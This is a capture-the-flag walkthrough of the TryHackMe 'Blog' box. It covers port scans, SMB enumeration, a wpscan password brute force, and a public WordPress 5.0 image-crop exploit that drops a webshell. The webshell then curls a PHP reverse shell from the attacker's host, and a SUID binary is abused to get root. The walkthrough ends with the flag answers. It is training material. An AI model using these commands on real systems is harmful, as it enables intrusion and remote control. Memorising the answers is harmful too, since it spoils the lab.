# Task 1 Blog

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

_In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file._

_Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)_

### root.txt

### user.txt

### Where was user.txt found?

### What CMS was Billy using?

### What version of the above CMS was being used?



I'm going to write walk through below

`nmap -sS -Pn -p- -T4 -vv 10.10.34.109`

We wee 22, 80, 139, 445 open

Navigate to the website, we see the blog.  As per the instructions, edit the hosts file and reload to get the page to render correctly.

### What CMS was Billy using?

Answer: `wordpress`

### What version of the above CMS was being used?

Using Wappalyzer plugin
Answer: `5.0`


`robots.txt` reveals
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```


`nmap -sS -Pn -p 22,80,139,445,21,443,3389 -sC -sV -T4 -vv 10.10.34.109 --osscan-guess` to identify OS (21,443,3389 are closed)

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 01:14 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:14
Completed NSE at 01:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:14
Completed NSE at 01:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:14
Completed NSE at 01:14, 0.00s elapsed
Initiating SYN Stealth Scan at 01:14
Scanning blog.thm (10.10.34.109) [7 ports]
Discovered open port 80/tcp on 10.10.34.109
Discovered open port 22/tcp on 10.10.34.109
Discovered open port 445/tcp on 10.10.34.109
Discovered open port 139/tcp on 10.10.34.109
Completed SYN Stealth Scan at 01:14, 0.31s elapsed (7 total ports)
Initiating Service scan at 01:14
Scanning 4 services on blog.thm (10.10.34.109)
Completed Service scan at 01:14, 11.86s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.34.109.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:14
Completed NSE at 01:15, 9.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:15
Completed NSE at 01:15, 1.18s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:15
Completed NSE at 01:15, 0.00s elapsed
Nmap scan report for blog.thm (10.10.34.109)
Host is up, received user-set (0.28s latency).
Scanned at 2023-10-27 01:14:43 EDT for 23s

PORT     STATE  SERVICE       REASON         VERSION
21/tcp   closed ftp           reset ttl 61
22/tcp   open   ssh           syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
80/tcp   open   http          syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp  open   netbios-ssn   syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp  closed https         reset ttl 61
445/tcp  open                 syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3389/tcp closed ms-wbt-server reset ttl 61
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-10-27T05:14:56+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24385/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61248/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59820/udp): CLEAN (Failed to receive data)
|   Check 4 (port 55607/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2023-10-27T05:14:56
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:15
Completed NSE at 01:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:15
Completed NSE at 01:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:15
Completed NSE at 01:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds
Raw packets sent: 7 (308B) | Rcvd: 7 (296B)
```

`gobuster dir --url blog.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`


Nothing much found there, run `enum4linux -a 10.10.34.109`

We find `print$`, `BillySMB` and `IPC$` shares with SMB1.

We have read access to `BillySMB`
Minimum password length is 5.

Usernames `bjoel` and `smb`

We connect
`smbclient //10.10.34.109/BillySMB` as any account
```
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020
```

The images and video are what looks to be rabbit holes.  We do however have write access to that share.

The username `bjoel` is valid for wordpress, but no password.

`wpscan --rua -e tt,cb,dbe --url http://blog.thm` reveals another user `kwheel`

Attempt brute force

put `bjoel` and `kwheel` in `user.txt`
`wpscan --url http://blog.thm -P rockyou.txt -U user.txt -t 75`

Eventually the password for `kwheel` is revealed as `cutiepie1`


Wordpress version 5.0 is vulnerable to CVE-2019-8943.

Using the exploit from https://github.com/hadrian3689/wordpress_cropimage

`python wp_rce.py -t http://blog.thm -u kwheel -p cutiepie1 -m twentytwenty`

```
WordPress ImageCrop CVE 2019-8942

Login in
Login successful!

Getting Wp Nonce
Wp Nonce retrieved successfully ! _wpnonce: 7ad4689650

Uploading the image
Image uploaded successfully with Image ID: 38

Changing the path
Path has been changed successfully!

Getting Ajax nonce
Ajax Nonce retrieved successfully ! ajax_nonce: bcb9351293

Cropping the uploaded image
Done!

Creating a new post to include the image
Post created successfully!

Dropping Backdoor rse.php
Backdoor URL: http://blog.thm/rse.php

Example Payload: http://blog.thm/rse.php?0=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have a webshell

```
http://blog.thm/rse.php?0=whoami
www-data
```
running from `/var/www/wordpress`

Get a PHP reverse shell code (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), modify the IP and port
`python3 -m http.server 81` where the shell.php is.
In the webshell `/rse.php?0=curl%20http%3A%2F%2F10.4.18.254%3A81%2Fshell.php%20--output%20shell.php`.
Setup a listener and run the php `/shell.php`

We now have a remote shell

make a better shell - `python -c 'import pty;pty.spawn("/bin/bash")'`

Found a `user.txt` in /home/bjoel but this isn't the right one
```
$ cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

There is also his termination letter from Rubber Ducky Inc in that directory.
Reading the termination letter he was fired for removable media violations amongst other things.  There is a `usb` folder in `media` but we don't have access to that.

Checking files with SUID bit set we find `/usr/sbin/checker`
Running it reports we are not an Admin -- which is correct.  Copy the file locally, and examine it
Strings wasn't useful;
Open the file in Ghidra and we can we that it is getting an environment variable called admin, and if it exists, it runs a shell.

![[Blog01.png]]

We can then do `export admin="yep"`
run checker and it spawns a shell as root.

### Where was user.txt found?
Answer: `/media/usb`

### user.txt

Answer: `c8421899aae571f7af486492b71a8ab7`

### root.txt

Answer: `9a0b2b618bef9bfa7ac28c1353d9f318`